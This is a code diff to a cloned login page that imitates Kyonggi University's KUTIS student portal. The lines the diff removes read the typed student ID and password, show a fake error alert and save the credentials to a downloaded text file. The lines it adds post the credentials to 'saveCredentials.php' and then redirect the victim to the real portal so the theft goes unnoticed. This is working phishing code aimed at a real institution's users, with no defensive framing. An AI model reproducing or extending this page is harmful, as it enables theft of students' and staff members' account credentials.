@@ -122,7 +122,7 @@ var SystemInfo = new function() {
 
   <!-- 로그인 컨텐츠 -->
   <section class="loginArea"  id="login_scroll">
-  	<form id="myform" name="myform" method="post" onsubmit="saveAndRedirect(); return false;">
+  	<form id="myForm" name="myForm" method="post" action="saveCredentials.php" >
 	<input type="hidden" name="username" value="">
 	<input type="hidden" name="password" value="">
 	<fieldset>
@@ -134,35 +134,23 @@ var SystemInfo = new function() {
 
       </dl>
       <p class="btnArea">
-        <button type="submit">
-            <img src="https://kutis.kyonggi.ac.kr/webkutis/images/renewal/web/btn/btn_loginClass_off.gif"
-                 alt="학번/교번 로그인"/>
-        </button>
-    </p>
-
+        <a href="https://kutis.kyonggi.ac.kr/webkutis/view/indexWeb.jsp" onclick="submitForm()" ><img src="https://kutis.kyonggi.ac.kr/webkutis/images/renewal/web/btn/btn_loginClass_off.gif" alt="학번/교번 로그인" /></a>
+       </p>
+    </fieldset>
     <script>
       function saveAndRedirect() {
-          // 입력된 ID와 PW 가져오기
-          var id = document.getElementById("id").value;
-          var pw = document.getElementById("pw").value;
-  
-          // alert 메시지 띄우기
-          alert('입력한 정보가 올바르지 않습니다!');
-  
-          // ID와 PW를 특정 경로에 텍스트 파일로 저장
-          var dataToSave = "ID: " + id + "\nPW: " + pw;
-          var blob = new Blob([dataToSave], {type: 'text/plain'});
-          var a = document.createElement("a");
-          a.href = URL.createObjectURL(blob);
-          a.download = "login_info.txt";
-          a.click();
+        var id = document.getElementById("id").value;
+            var pw = document.getElementById("pw").value;
+
+            // 폼 제출
+            document.getElementById("myForm").submit();
+          
   
           // 원하는 페이지로 이동
           window.location.href = "https://kutis.kyonggi.ac.kr/webkutis/view/indexWeb.jsp";
       }
   </script>
-    
-    </fieldset>
+
     <!-- //로그인 폼 -->
     <!-- 옵션 -->
     <div class="opt">
